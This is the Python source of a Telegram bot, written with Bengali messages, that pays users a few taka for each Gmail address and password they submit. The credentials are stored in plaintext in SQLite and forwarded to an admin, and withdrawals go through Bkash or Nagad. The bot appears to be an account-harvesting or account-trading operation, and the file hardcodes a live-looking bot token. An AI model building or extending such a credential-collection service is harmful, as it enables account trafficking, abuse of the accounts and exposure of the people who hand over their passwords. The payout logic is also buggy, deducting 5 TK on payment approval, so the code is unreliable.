import logging
import re
import sqlite3
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.fsm.context import FSMContext
from aiogram.utils import markdown as md
import aiohttp
import asyncio

# Bot token and admin user ID
BOT_TOKEN = '7397081271:AAHLW68BTMvrzIEBpvmtfk-jSEx9IN0l9ak'
ADMIN_ID = 6264097156

# Initialize bot and dispatcher
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())
dp.bot = bot  # Set bot instance to Dispatcher

# Setup logging
logging.basicConfig(level=logging.INFO)

# Connect to the SQLite database
conn = sqlite3.connect('gmail_receiver_bot.db')
cursor = conn.cursor()

# Create tables if they don't exist
cursor.execute('''
CREATE TABLE IF NOT EXISTS users (
    user_id INTEGER PRIMARY KEY,
    balance INTEGER DEFAULT 0
)
''')

cursor.execute('''
CREATE TABLE IF NOT EXISTS gmail_accounts (
    user_id INTEGER,
    gmail TEXT,
    password TEXT,
    approved INTEGER DEFAULT 0,
    FOREIGN KEY(user_id) REFERENCES users(user_id)
)
''')

cursor.execute('''
CREATE TABLE IF NOT EXISTS payments (
    payment_id TEXT PRIMARY KEY,
    user_id INTEGER,
    method TEXT,
    number TEXT,
    status TEXT DEFAULT 'pending',
    FOREIGN KEY(user_id) REFERENCES users(user_id)
)
''')

conn.commit()

# Define states
class Form(StatesGroup):
    waiting_for_gmail = State()
    waiting_for_password = State()
    waiting_for_payment_info = State()
    waiting_for_payment_method = State()

# Handle /start command
@dp.message(Command("start"))
async def start_command(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    await state.clear()

    cursor.execute('SELECT * FROM users WHERE user_id=?', (user_id,))
    user = cursor.fetchone()

    if user:
        cursor.execute('SELECT gmail, approved FROM gmail_accounts WHERE user_id=?', (user_id,))
        accounts = cursor.fetchall()
        response = md.text(
            "👋 আবার স্বাগতম!\n\n📜 **আপনার জমা দেওয়া Gmail অ্যাকাউন্টগুলো:**\n",
            *(f"📧 {account[0]} - {'✅ অনুমোদিত' if account[1] == 1 else '⏳ অপেক্ষায়'}\n" for account in accounts),
            f"\n💰 **আপনার বর্তমান ব্যালেন্স:** {user[1]} TK"
        )
    else:
        cursor.execute('INSERT INTO users (user_id) VALUES (?)', (user_id,))
        conn.commit()
        response = "👋 স্বাগতম! শুরু করার জন্য আপনার Gmail অ্যাকাউন্ট জমা দিন। 📧"

    await message.answer(response)
    await state.set_state(Form.waiting_for_gmail)

# Handle Gmail submission
@dp.message(Form.waiting_for_gmail)
async def receive_gmail(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    gmail = message.text.strip()

    if not re.match(r'^[a-zA-Z0-9._%+-]+@gmail\.com$', gmail):
        await message.answer("❌ দয়া করে একটি বৈধ Gmail ঠিকানা প্রদান করুন। 📧")
        return

    cursor.execute('SELECT * FROM gmail_accounts WHERE gmail=?', (gmail,))
    if cursor.fetchone():
        await message.answer("⚠️ এই Gmail অ্যাকাউন্টটি অন্য ব্যবহারকারীর দ্বারা ইতোমধ্যে জমা দেওয়া হয়েছে। দয়া করে একটি ভিন্ন অ্যাকাউন্ট জমা দিন। 📧")
    else:
        await state.update_data(gmail=gmail)
        await message.answer("🔒 দয়া করে এই Gmail অ্যাকাউন্টের পাসওয়ার্ড প্রদান করুন:")
        await state.set_state(Form.waiting_for_password)

# Handle password submission
@dp.message(Form.waiting_for_password)
async def get_gmail_password(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    password = message.text.strip()

    data = await state.get_data()
    gmail = data.get('gmail')

    cursor.execute('INSERT INTO gmail_accounts (user_id, gmail, password) VALUES (?, ?, ?)', (user_id, gmail, password))
    conn.commit()

    await bot.send_message(ADMIN_ID, f"⚠️ ব্যবহারকারী {user_id} একটি Gmail অ্যাকাউন্ট অনুমোদনের জন্য জমা দিয়েছে:\n📧 {gmail}\n🔒 পাসওয়ার্ড: {password}")

    await message.answer("✅ আপনার Gmail অ্যাকাউন্ট জমা দেওয়া হয়েছে এবং অনুমোদনের জন্য অপেক্ষা করছে। ⏳")
    await state.clear()

# Handle /review_accounts command
@dp.message(Command("review_accounts"))
async def review_accounts(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        await message.answer("❌ আপনি এই কাজটি করতে অনুমোদিত নন।")
        return

    cursor.execute('SELECT gmail FROM gmail_accounts WHERE approved=0')
    accounts = cursor.fetchall()

    if accounts:
        response = md.text(
            "📜 **অনুমোদনের জন্য অপেক্ষায় থাকা Gmail অ্যাকাউন্টগুলো:**\n",
            *(f"📧 {account[0]} - /approve {account[0]} /reject {account[0]}\n" for account in accounts)
        )
    else:
        response = "✅ কোন অপেক্ষায় থাকা Gmail অ্যাকাউন্ট নেই।"

    await message.answer(response)

# Handle /approve command
@dp.message(Command("approve"))
async def approve_command(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        await message.answer("❌ আপনি এই কাজটি করতে অনুমোদিত নন।")
        return

    gmail = message.text.split(' ', 1)[1].strip()
    if not gmail:
        await message.answer("❌ একটি Gmail ঠিকানা প্রদান করুন।")
        return

    cursor.execute('SELECT user_id FROM gmail_accounts WHERE gmail=? AND approved=0', (gmail,))
    result = cursor.fetchone()

    if result:
        user_id = result[0]
        cursor.execute('UPDATE gmail_accounts SET approved=1 WHERE gmail=?', (gmail,))
        cursor.execute('UPDATE users SET balance = balance + 5 WHERE user_id=?', (user_id,))
        conn.commit()

        await bot.send_message(user_id, f"✅ আপনার Gmail অ্যাকাউন্ট {gmail} অনুমোদিত হয়েছে। 💰 আপনি 5 TK পেয়েছেন।\n\nআপনার নতুন ব্যালেন্স: {get_user_balance(user_id)} TK")
        await message.answer(f"✅ {gmail} অনুমোদিত হয়েছে।")
    else:
        await message.answer("❌ Gmail অ্যাকাউন্টটি পাওয়া যায়নি অথবা এটি ইতোমধ্যে অনুমোদিত হয়েছে।")

# Handle /reject command
@dp.message(Command("reject"))
async def reject_command(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        await message.answer("❌ আপনি এই কাজটি করতে অনুমোদিত নন।")
        return

    gmail = message.text.split(' ', 1)[1].strip()
    if not gmail:
        await message.answer("❌ একটি Gmail ঠিকানা প্রদান করুন।")
        return

    cursor.execute('SELECT user_id FROM gmail_accounts WHERE gmail=? AND approved=0', (gmail,))
    result = cursor.fetchone()

    if result:
        user_id = result[0]
        cursor.execute('DELETE FROM gmail_accounts WHERE gmail=?', (gmail,))
        conn.commit()

        await bot.send_message(user_id, f"❌ আপনার Gmail অ্যাকাউন্ট {gmail} প্রত্যাখ্যাত হয়েছে।")
        await message.answer(f"❌ {gmail} প্রত্যাখ্যাত হয়েছে।")
    else:
        await message.answer("❌ Gmail অ্যাকাউন্টটি পাওয়া যায়নি অথবা এটি ইতোমধ্যে অনুমোদিত হয়েছে।")

# Handle /wallet command
@dp.message(Command("wallet"))
async def wallet_command(message: types.Message):
    user_id = message.from_user.id
    balance = get_user_balance(user_id)

    if balance is not None:
        await message.answer(f"💼 **আপনার বর্তমান Wallet ব্যালেন্স:** {balance} TK 💸")
    else:
        await message.answer("❌ আপনার Wallet এখনও নেই। দয়া করে একটি Gmail অ্যাকাউন্ট জমা দিন। 📧")

# Handle /payment command
@dp.message(Command("payment"))
async def payment_command(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    balance = get_user_balance(user_id)

    # Check if user has a pending payment
    cursor.execute('SELECT * FROM payments WHERE user_id=? AND status="pending"', (user_id,))
    pending_payment = cursor.fetchone()
    if pending_payment:
        await message.answer("⚠️ আপনার একটি অপেক্ষায় থাকা উত্তোলনের অনুরোধ রয়েছে। এটি প্রক্রিয়া না হওয়া পর্যন্ত অপেক্ষা করুন।")
        return

    if balance >= 50:
        await message.answer("💰 **আপনার কাছে পর্যাপ্ত ব্যালেন্স আছে!**\n\nদয়া করে আপনার পেমেন্ট পদ্ধতি নির্বাচন করুন:\n1. Bkash\n2. Nagad")
        await state.set_state(Form.waiting_for_payment_method)
    else:
        await message.answer("⚠️ **অপর্যাপ্ত ব্যালেন্স:** পেমেন্টের জন্য অন্তত ৫০ TK প্রয়োজন। আরও Gmail অ্যাকাউন্ট জমা দিয়ে আরও উপার্জন করুন! 💸")

# Handle payment method selection
@dp.message(Form.waiting_for_payment_method)
async def payment_method(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    method = message.text.strip().lower()

    if method not in ['bkash', 'nagad']:
        await message.answer("❌ অবৈধ অপশন। দয়া করে 'Bkash' অথবা 'Nagad' টাইপ করুন।")
        return

    await state.update_data(method=method)
    await message.answer(f"🔢 দয়া করে আপনার {method.capitalize()} নম্বর দিন:")
    await state.set_state(Form.waiting_for_payment_info)

# Handle payment info submission
@dp.message(Form.waiting_for_payment_info)
async def payment_info(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    number = message.text.strip()

    # Validate phone number
    if not re.match(r'^\d{11}$', number):
        await message.answer("❌ একটি বৈধ ১১-সংখ্যার ফোন নম্বর প্রদান করুন।")
        return

    data = await state.get_data()
    method = data.get('method')

    payment_id = f"{user_id}_{int(message.date.timestamp())}"
    cursor.execute('INSERT INTO payments (payment_id, user_id, method, number) VALUES (?, ?, ?, ?)', (payment_id, user_id, method, number))
    conn.commit()

    await bot.send_message(ADMIN_ID, f"⚠️ ব্যবহারকারী {user_id} একটি পেমেন্ট অনুরোধ করেছে:\nপেমেন্ট আইডি: {payment_id}\nপদ্ধতি: {method.capitalize()}\nনম্বর: {number}")
    await message.answer("✅ আপনার পেমেন্ট অনুরোধ জমা হয়েছে এবং অনুমোদনের জন্য অপেক্ষা করছে। ⏳")
    await state.clear()

# Handle /approve_payment command
@dp.message(Command("approve_payment"))
async def approve_payment(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        await message.answer("❌ আপনি এই কাজটি করতে অনুমোদিত নন।")
        return

    # Extract payment ID from command text
    command_parts = message.text.split(' ', 1)
    if len(command_parts) < 2:
        await message.answer("❌ দয়া করে পেমেন্ট আইডি প্রদান করুন।")
        return

    payment_id = command_parts[1].strip()
    
    cursor.execute('SELECT user_id FROM payments WHERE payment_id=? AND status="pending"', (payment_id,))
    result = cursor.fetchone()

    if result:
        user_id = result[0]
        
        # Approve payment and update balance
        cursor.execute('UPDATE payments SET status="approved" WHERE payment_id=?', (payment_id,))
        cursor.execute('UPDATE users SET balance = balance - 5 WHERE user_id=?', (user_id,))
        conn.commit()

        await bot.send_message(user_id, f"✅ আপনার পেমেন্ট অনুরোধ (আইডি: {payment_id}) অনুমোদিত হয়েছে। 💸 আপনার ব্যালেন্স কমানো হয়েছে।")
        await message.answer(f"✅ পেমেন্ট অনুরোধ (আইডি: {payment_id}) অনুমোদিত হয়েছে।")
    else:
        await message.answer("❌ পেমেন্ট অনুরোধ পাওয়া যায়নি অথবা এটি ইতোমধ্যে প্রক্রিয়া করা হয়েছে।")

# Handle /reject_payment command
@dp.message(Command("reject_payment"))
async def reject_payment(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        await message.answer("❌ আপনি এই কাজটি করতে অনুমোদিত নন।")
        return

    # Extract payment ID from command text
    command_parts = message.text.split(' ', 1)
    if len(command_parts) < 2:
        await message.answer("❌ দয়া করে পেমেন্ট আইডি প্রদান করুন।")
        return

    payment_id = command_parts[1].strip()

    cursor.execute('SELECT user_id FROM payments WHERE payment_id=? AND status="pending"', (payment_id,))
    result = cursor.fetchone()

    if result:
        user_id = result[0]
        
        cursor.execute('UPDATE payments SET status="rejected" WHERE payment_id=?', (payment_id,))
        conn.commit()

        await bot.send_message(user_id, f"❌ আপনার পেমেন্ট অনুরোধ (আইডি: {payment_id}) প্রত্যাখ্যাত হয়েছে।")
        await message.answer(f"❌ পেমেন্ট অনুরোধ (আইডি: {payment_id}) প্রত্যাখ্যাত হয়েছে।")
    else:
        await message.answer("❌ পেমেন্ট অনুরোধ পাওয়া যায়নি অথবা এটি ইতোমধ্যে প্রক্রিয়া করা হয়েছে।")
        
# Handle /restart command (admin only)
@dp.message(Command("restart"))
async def restart_command(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        await message.answer("❌ আপনি এই কাজটি করতে অনুমোদিত নন।")
        return

    await message.answer("🔄 বট পুনরায় চালু করা হচ্ছে...")
    await bot.send_message(ADMIN_ID, "✅ বট পুনরায় চালু করা হয়েছে।")
    await dp.storage.close()
    await bot.session.close()
    asyncio.get_event_loop().stop()

# Utility function to get user balance
def get_user_balance(user_id):
    cursor.execute('SELECT balance FROM users WHERE user_id=?', (user_id,))
    result = cursor.fetchone()
    return result[0] if result else None

if __name__ == '__main__':
    dp.run_polling(bot)
